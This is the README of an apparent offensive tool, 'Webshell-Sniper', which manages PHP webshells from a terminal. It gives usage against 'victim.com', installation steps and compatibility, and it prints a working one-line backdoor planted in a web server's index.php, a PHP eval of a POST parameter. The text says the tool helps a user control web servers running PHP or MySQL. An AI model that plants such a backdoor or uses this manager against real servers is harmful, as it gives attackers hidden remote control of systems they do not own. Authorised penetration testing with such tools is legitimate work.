# Webshell-Sniper
A webshell manager via terminal

#### Usage :
```
Usage : 
        python webshell-sniper.py [URL] [METHOD] [AUTH]
Example : 
        python webshell-sniper.py http://127.0.0.1/c.php POST c
Author : 
        WangYihang <wangyihanger@gmail.com>
```
```
# cat /var/www/html/index.php
<?php eval($_POST['s3cr3t']);?>
# python webshell-sniper.py http://victim.com/index.php POST s3cr3t
...
```

#### Installation:
```
git clone https://github.com/WangYihang/Webshell-Sniper
cd Webshell-Sniper
pip install -r requirements.txt
```

#### Example : 

> v1.1.2

[![A Pentest Example via Webshell-Sniper (YouTube)](./images/pentest_0.png)](https://www.youtube.com/watch?v=iAUwb8SSS4s)

#### Compatibility :
```
Enviroment :
    Attacker :
        Linux
        python 2.7
    Victim :
        apache 2.4
        php 7.0
```

#### Addations:
1. This tool only support to run on unix-like system.
2. It is able to help user control web server which is running PHP or MySQL
